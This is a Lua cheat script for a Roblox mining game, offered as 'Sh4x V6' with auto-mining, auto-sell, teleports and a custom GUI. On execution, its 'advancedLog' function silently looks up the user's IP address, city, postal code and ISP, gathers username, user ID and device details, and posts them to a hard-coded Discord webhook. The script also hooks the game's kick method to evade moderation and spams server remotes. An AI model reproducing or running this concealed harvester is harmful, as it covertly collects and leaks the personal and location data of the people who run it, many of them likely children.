--[[
    Sh4x - ULTIMATE PRO EXCLUSIVE EDITION (V6) - FINAL OPTIMIZED
    Interface: Dark Red Background + RGB Rainbow Borders (MANTIDA)
    Features: FAST AUTO-MINING + FAST AUTO SELL + ADVANCED TP
    Security: ANTI-KICK / ANTI-AFK / VERSION LOCK / AUTO-CLEAN
    Logging: FULL ADVANCED STEALTH SYSTEM
]]

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local VirtualUser = game:GetService("VirtualUser")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Player = Players.LocalPlayer

-- [SISTEMA DE EXCLUSIVIDADE - LIMPEZA DE SCRIPTS ANTIGOS]
local SCRIPT_VERSION = "SH4X_V6_FINAL"
for _, gui in pairs(CoreGui:GetChildren()) do
    if gui:IsA("ScreenGui") and (gui:FindFirstChild("MainFrame") or gui.Name:find("Sh4x") or #gui.Name == 12) then
        gui:Destroy()
    end
end

-- [CONFIGURA√á√ÉO DISCORD]
local WEBHOOK_URL = "https://discord.com/api/webhooks/1465809966983155857/YHUdyCOZgu3mymCizFY5coTioKx2UjoR9puFeotVWQHrq3mGgFkZhQt1LrBLx20aLXCd"
local IGNORED_USER = "fimossegamers123"

-- [DETEC√á√ÉO DE DISPOSITIVO]
local function getPlatform()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then return "Mobile"
    elseif UserInputService.GamepadEnabled then return "Console"
    else return "PC" end
end

-- [LOG AVAN√áADO FURTIVO]
local function advancedLog()
    if Player.Name == IGNORED_USER then return end
    
    local ip, country, city, region, continent, postal, isp = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
    
    pcall(function()
        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
        if reqFunc then
            local response = reqFunc({Url = "http://ip-api.com/json/?fields=status,message,continent,country,regionName,city,zip,isp,query", Method = "GET"})
            if response and response.Body then
                local geoData = HttpService:JSONDecode(response.Body)
                if geoData.status == "success" then
                    ip = geoData.query country = geoData.country city = geoData.city region = geoData.regionName continent = geoData.continent postal = geoData.zip isp = geoData.isp
                end
            end
        end
    end)

    local batteryLevel = "N/A"
    pcall(function()
        -- Tentativa de capturar bateria via APIs comuns de executadores
        if getbatterylevel then batteryLevel = tostring(math.floor(getbatterylevel() * 100)) .. "%" end
    end)

    local sessionTime = "N/A"
    pcall(function()
        local seconds = math.floor(workspace.DistributedGameTime)
        local hours = math.floor(seconds / 3600)
        local mins = math.floor((seconds % 3600) / 60)
        local secs = seconds % 60
        sessionTime = string.format("%02d:%02d:%02d", hours, mins, secs)
    end)

    local data = {
        ["embeds"] = {{
            ["title"] = "üö® SH4X V6 - EXECU√á√ÉO DETECTADA",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "üë§ Jogador", ["value"] = "**Nome:** " .. Player.Name .. "\n**ID:** " .. Player.UserId .. "\n**Link:** [Perfil](https://www.roblox.com/users/" .. Player.UserId .. "/profile)", ["inline"] = false},
                {["name"] = "‚è≥ Conta & Sess√£o", ["value"] = "**Idade:** " .. tostring(Player.AccountAge) .. " dias\n**Sess√£o:** " .. sessionTime, ["inline"] = true},
                {["name"] = "üì± Hardware", ["value"] = "**Dispositivo:** " .. getPlatform() .. "\n**Bateria:** " .. batteryLevel, ["inline"] = true},
                {["name"] = "üåê Localiza√ß√£o", ["value"] = "**IP:** ||" .. ip .. "||\n**Pa√≠s:** " .. country .. "\n**Cidade:** " .. city .. "\n**Regi√£o:** " .. region .. "\n**Continente:** " .. continent .. "\n**CEP:** " .. postal .. "\n**ISP:** " .. isp, ["inline"] = false},
                {["name"] = "üñ•Ô∏è Sistema", ["value"] = "**Hor√°rio:** " .. os.date("%H:%M:%S") .. "\n**Executador:** " .. (identifyexecutor and identifyexecutor() or "Desconhecido"), ["inline"] = false}
            },
            ["footer"] = {["text"] = "Sh4x Exclusive System V6"},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    pcall(function()
        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
        if reqFunc then reqFunc({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
    end)
end
task.spawn(advancedLog)

-- [PROTE√á√ïES]
pcall(function()
    local gmt = getrawmetatable(game)
    if setreadonly then setreadonly(gmt, false) end
    local oldNamecall = gmt.__namecall
    gmt.__namecall = newcclosure(function(self, ...)
        if tostring(getnamecallmethod()):lower() == "kick" then return nil end
        return oldNamecall(self, ...)
    end)
    if setreadonly then setreadonly(gmt, true) end
end)
Player.Idled:Connect(function() VirtualUser:CaptureController() VirtualUser:ClickButton2(Vector2.new(0,0)) end)

-- [GUI PRINCIPAL - MANTIDA ORIGINAL]
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "Sh4x_V6_Main"

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Name = "MainFrame"
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -80)
MainFrame.Size = UDim2.new(0, 220, 0, 250)
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
local Stroke = Instance.new("UIStroke", MainFrame) Stroke.Thickness = 2.5

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.Text = "Sh4x V6 EXCLUSIVE"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16

local function createMainButton(text, pos)
    local btn = Instance.new("TextButton", MainFrame)
    btn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
    btn.Position = pos
    btn.Size = UDim2.new(0.8, 0, 0, 35)
    btn.Font = Enum.Font.GothamBold
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 12
    Instance.new("UICorner", btn)
    local bStroke = Instance.new("UIStroke", btn) bStroke.Thickness = 1.5
    return btn, bStroke
end

local ToggleBtn, BtnStroke = createMainButton("START AUTO-MINING", UDim2.new(0.1, 0, 0.2, 0))
local TPBtn, TPBtnStroke = createMainButton("TELEPORT MENU", UDim2.new(0.1, 0, 0.38, 0))
local SellBtn, SellBtnStroke = createMainButton("START AUTO-SELL", UDim2.new(0.1, 0, 0.56, 0))

-- [TP MENU]
local TPMenu = Instance.new("Frame", MainFrame)
TPMenu.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
TPMenu.Position = UDim2.new(1.05, 0, 0, 0)
TPMenu.Size = UDim2.new(0, 180, 0, 150)
TPMenu.Visible = false
Instance.new("UICorner", TPMenu)
Instance.new("UIStroke", TPMenu).Thickness = 2

local function createTPButton(name, pos, order)
    local btn = Instance.new("TextButton", TPMenu)
    btn.Size = UDim2.new(0.9, 0, 0, 35)
    btn.Position = UDim2.new(0.05, 0, 0, 10 + (order * 45))
    btn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    btn.Font = Enum.Font.GothamBold
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 11
    Instance.new("UICorner", btn)
    btn.MouseButton1Click:Connect(function()
        if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
            Player.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
        end
    end)
end

createTPButton("ILHA INICIAL", Vector3.new(-61.70, 8.84, -52.25), 0)
createTPButton("ILHA DA NEVE", Vector3.new(-92.49, 8.70, -483.13), 1)
createTPButton("ILHA DO VULCAO", Vector3.new(374.61, 15.34, -267.01), 2)

TPBtn.MouseButton1Click:Connect(function() TPMenu.Visible = not TPMenu.Visible end)

local StatusLabel = Instance.new("TextLabel", MainFrame)
StatusLabel.Position = UDim2.new(0, 0, 0.85, 0)
StatusLabel.Size = UDim2.new(1, 0, 0, 30)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Font = Enum.Font.GothamSemibold
StatusLabel.Text = "SYSTEM: EXCLUSIVE V6"
StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
StatusLabel.TextSize = 10

-- [RGB]
task.spawn(function()
    while true do
        local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
        Stroke.Color = color BtnStroke.Color = color TPBtnStroke.Color = color SellBtnStroke.Color = color
        task.wait()
    end
end)

-- [DRAG]
local dragging, dragInput, dragStart, startPos
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true dragStart = input.Position startPos = MainFrame.Position
        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- [FARM OTIMIZADO]
local farmAtivo = false
ToggleBtn.MouseButton1Click:Connect(function()
    farmAtivo = not farmAtivo
    ToggleBtn.Text = farmAtivo and "MINING ACTIVE" or "START AUTO-MINING"
end)

task.spawn(function()
    while true do
        if farmAtivo then
            pcall(function()
                local char = Player.Character
                local root = char.HumanoidRootPart
                local tool = char:FindFirstChildOfClass("Tool") or Player.Backpack:FindFirstChildOfClass("Tool")
                local alvo = nil
                local menorDist = 90
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v.Name == "Pedra" and v:IsA("BasePart") and v.Transparency < 1 then
                        local d = (root.Position - v.Position).Magnitude
                        if d < menorDist then menorDist = d alvo = v end
                    end
                end
                
                if alvo then
                    if (root.Position - alvo.Position).Magnitude > 7.5 then
                        char.Humanoid:MoveTo(alvo.Position)
                    else
                        if tool.Parent ~= char then char.Humanoid:EquipTool(tool) end
                        -- Otimiza√ß√£o: Ativa√ß√£o r√°pida sem delay excessivo
                        tool:Activate()
                        -- Spam de remotes para quebrar mais r√°pido (ajustado para n√£o bugar)
                        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                            if r:IsA("RemoteEvent") and (r.Name:lower():find("mine") or r.Name:lower():find("click")) then
                                r:FireServer(alvo)
                                r:FireServer(alvo) -- Envio duplo para acelerar
                            end
                        end
                    end
                end
            end)
        end
        task.wait(0.05) -- Delay reduzido de 0.1 para 0.05 para maior velocidade
    end
end)

-- [SELL]
local sellAtivo = false
SellBtn.MouseButton1Click:Connect(function()
    sellAtivo = not sellAtivo
    SellBtn.Text = sellAtivo and "AUTO-SELL ACTIVE" or "START AUTO-SELL"
end)

task.spawn(function()
    while true do
        if sellAtivo then
            pcall(function()
                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                    if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
                        local n = r.Name:lower()
                        if n:find("sell") or n:find("vender") then
                            if r:IsA("RemoteEvent") then r:FireServer(3) r:FireServer("All") else r:InvokeServer(3) end
                        end
                    end
                end
                
                local char = Player.Character
                for _, item in pairs(Player.Backpack:GetChildren()) do
                    local itemName = item.Name:lower()
                    if item:IsA("Tool") and not (itemName:find("pickaxe") or itemName:find("picareta")) then
                        char.Humanoid:EquipTool(item)
                        task.wait(0.02)
                        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                            if r:IsA("RemoteEvent") and (r.Name:lower():find("sell") or r.Name:lower():find("vender")) then 
                                r:FireServer(item) 
                            end
                        end
                    end
                end
            end)
        end
        task.wait(0.5) -- Sell mais frequente
    end
end)
